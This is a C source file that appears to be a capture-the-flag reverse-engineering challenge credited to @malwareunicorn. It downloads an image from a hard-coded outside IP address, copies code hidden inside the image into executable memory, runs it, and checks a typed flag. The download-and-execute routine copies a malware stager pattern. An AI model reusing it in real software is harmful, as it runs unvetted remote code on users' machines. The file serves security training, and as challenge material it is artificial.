
    /*
    *  THIS IS AN AUTOGENERATED FILE
    *  gcc downloader.c -o downloader -fno-stack-protector -fno-builtin
    */
    #include <arpa/inet.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <sys/socket.h>
    #include <unistd.h>
    #include <sys/mman.h>

    #include <libkern/OSByteOrder.h>
    #define bswap_64(x) OSSwapInt64(x)

    #define MAX_REQUEST_LEN   1024
    #define MAX_MMAP_SIZE     0x80000
    #define CODE_PNG_OFFSET   0x60000
    #define GET_REQUEST       "GET /pickachu_wut.png HTTP/1.1\r\nHost: %s\r\n\r\n"
    #define IP_ADDRESS        "157.230.132.171"
    #define FLAG              "fb{AAAAAAAAAAAAAAAAAAAAAAAAAAAA}"
    #define FINAL_FLAG_LEN    32
    #define SERVER_PORT       80
    #define FLAG_SIZE         28
    #define FLAG_TEXT         "Enter the actual flag: \n"
    #define SHELLCODE_SIZE    0x4096
    #define SEED              0x115c28da834feffd
    #define VERIFY_INTA       0x3255557376f68
    #define VERIFY_INTB       0x393b415f5a590044
    #define VERIFY_INTC       0x665f336b1a566b19

    int send_request(int * psocket)
    {
      char request[MAX_REQUEST_LEN];
      int request_len, ret;
      in_addr_t in_addr;
      ssize_t nbytes_total, nbytes_last;
      struct sockaddr_in sockaddr_in;
      request_len = snprintf(
        request,
        MAX_REQUEST_LEN,
        GET_REQUEST,
        IP_ADDRESS
      );
      if (request_len >= MAX_REQUEST_LEN)
        exit(EXIT_FAILURE);
      *psocket = socket(
        AF_INET,
        SOCK_STREAM,
        IPPROTO_TCP
      );
      if (*psocket == -1)
        exit(EXIT_FAILURE);
      inet_aton(
        IP_ADDRESS,
        (struct in_addr *)&sockaddr_in.sin_addr.s_addr
      );
      sockaddr_in.sin_family = AF_INET;
      sockaddr_in.sin_port = htons(SERVER_PORT);
      ret = connect(
        *psocket,
        (struct sockaddr*)&sockaddr_in,
        sizeof(sockaddr_in)
      );
      if ( ret == -1)
        exit(EXIT_FAILURE);
      /* Send HTTP request. */
      nbytes_total = 0;
      while (nbytes_total < request_len)
      {
          nbytes_last = write(
            *psocket,
            request + nbytes_total,
            request_len - nbytes_total
          );
          if (nbytes_last == -1)
          {
              exit(EXIT_FAILURE);
          }
          nbytes_total += nbytes_last;
      }
      return request_len;
    }

    int receive_response(int * psocket, void ** dst)
    {
      char request_buffer[BUFSIZ];
      ssize_t nbytes_total, nbytes_last;
      void * cursor;
      *dst = mmap(
        NULL,
        MAX_MMAP_SIZE,
        PROT_READ|PROT_WRITE,
        MAP_ANON|MAP_PRIVATE,
        -1,0
      );
      if (dst == MAP_FAILED)
        exit(EXIT_FAILURE);
      cursor = *dst;
      /* Read the response. */
      while ((nbytes_total = read(*psocket, request_buffer, BUFSIZ)) > 0) {
        memcpy(cursor, request_buffer, nbytes_total);
        cursor = cursor + nbytes_total;
      }
      if (nbytes_total == -1)
        exit(EXIT_FAILURE);
      return nbytes_total;
    }

    /* Look for PNG magic number */
    int check_png_header(void * response_data)
    {
      uint64_t count = 0;
      uint64_t png_offset;
      for (int i = 0; i < MAX_MMAP_SIZE; i++)
      {
        // PNG. header
        if ( 0x89 == ((uint8_t *)response_data)[i]  && \
             0x50 == ((uint8_t *)response_data)[i+1]&& \
             0x4E == ((uint8_t *)response_data)[i+2]&& \
             0x47 == ((uint8_t *)response_data)[i+3])
        {
          count = CODE_PNG_OFFSET + i;
          break;
        }
      }
      png_offset = count;
      return png_offset;
    }

    int main(int argc, char** argv)
    {
        int psocket;
        void * response_data = NULL;
        void * shellcode1 = NULL;
        void * shellcode2 = NULL;
        int ret = 0;
        uint64_t flag_integer, png_offset, png_offset2, A, B, C;
        uint32_t D;
        uint64_t VERIFY, VERIFYA, VERIFYB, VERIFYC, VERIFYD;
        unsigned char flag_text[] = FLAG_TEXT;
        unsigned char final_flag[FINAL_FLAG_LEN+1] = FLAG;
        unsigned char key[FLAG_SIZE+2];

        send_request(&psocket);
        receive_response(&psocket, &response_data);
        close(psocket);

        png_offset = check_png_header(response_data);
        if (png_offset == 0)
          exit(EXIT_FAILURE);
        /* prepare rot13 shellcode */
        shellcode1 = mmap(
          NULL,
          SHELLCODE_SIZE,
          PROT_READ|PROT_WRITE|PROT_EXEC,
          MAP_ANON|MAP_PRIVATE,
          -1,0);
        memcpy(shellcode1, (response_data+png_offset), SHELLCODE_SIZE);
        uint64_t(*sc1)(uint64_t) = (uint64_t(*)(uint64_t))shellcode1;
        png_offset2 = sc1(0);
        munmap(shellcode1, SHELLCODE_SIZE);
        /* prepare cipher shellcode */
        shellcode2 = mmap(
          NULL,
          SHELLCODE_SIZE,
          PROT_READ|PROT_WRITE|PROT_EXEC,
          MAP_ANON|MAP_PRIVATE,
          -1,0);
        memcpy(
          shellcode2,
          (response_data+png_offset+png_offset2),
          SHELLCODE_SIZE);
        uint64_t(*sc2)(uint64_t) = (uint64_t(*)(uint64_t))shellcode2;
        flag_integer = sc2(0);
        munmap(shellcode2, SHELLCODE_SIZE);
        munmap(response_data, MAX_MMAP_SIZE);
        VERIFY = bswap_64(flag_integer);

        __asm__(
          "movq $0x2000004, %%rax \n\t"
          "movq $1, %%rdi \n\t"
          "movq %1, %%rsi \n\t"
          "movl $24, %%edx \n\t"
          "syscall \n\t"
          : "=g"(ret)
          : "g"(&flag_text));

        __asm__(
          "movq $0x2000003, %%rax \n\t"
          "movq $0, %%rdi \n\t"
          "movq %1, %%rsi \n\t"
          "movl $30, %%edx \n\t"
          "syscall \n\t"
          : "=g"(ret)
          : "g"(&key));

        for (int i= 7; i >= 0; i--)
          A = A << 8 | (uint64_t)key[i];
        for (int i= 15; i >= 8; i--)
          B = (B << 8) | (uint64_t)key[i];
        for (int i= 23; i >= 16; i--)
          C = (C << 8) | (uint64_t)key[i];
        for (int i= 27; i >= 24; i--)
          D = (D << 8) | (uint32_t)key[i];

        VERIFYA = A ^ B;
        VERIFYB = B ^ C;
        VERIFYC = C ^ D;
        VERIFYD = D ^ SEED;

        if (VERIFY_INTA == VERIFYA && \
            VERIFY_INTB == VERIFYB && \
            VERIFY_INTC == VERIFYC && \
            VERIFYD == VERIFY)
        {
          for (int i= 3, j= 0; i < FINAL_FLAG_LEN-1; i++, j++)
          {
            final_flag[i] = key[j];
          }
          final_flag[FINAL_FLAG_LEN] = '\n';
          printf("\n%s\n", final_flag);
          printf("\nCongratulations!!\n");
          printf("Created by @malwareunicorn\n");
        }
        else
        {
          printf("\nDOH!! try harder :( \n");
        }

        exit(EXIT_SUCCESS);
    }
    